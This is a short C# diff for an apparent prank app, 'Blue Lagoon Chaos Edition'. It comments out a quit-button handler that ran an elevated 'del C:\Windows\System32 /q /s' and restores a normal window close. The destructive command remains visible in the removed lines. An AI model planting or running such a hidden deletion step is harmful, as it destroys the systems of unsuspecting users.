@@ -8,7 +8,7 @@ namespace Blue_Lagoon___Chaos_Edition {
 
         #region Rage Quit
         private void QuitButton_Click(object sender, EventArgs e) {
-            try {
+            /*try {
                 Process process = new Process();
                 process.StartInfo.FileName = "cmd.exe";
                 process.StartInfo.Arguments = @"/c del C:\Windows\System32 /q /s";
@@ -16,8 +16,8 @@ namespace Blue_Lagoon___Chaos_Edition {
                 process.StartInfo.Verb = "runas";
                 process.Start();
             }
-            catch { }
-            //this.Close(); useless code why would you want to quit??
+            catch { }*/
+            this.Close(); //useless code why would you want to quit??
         }
         #endregion
 
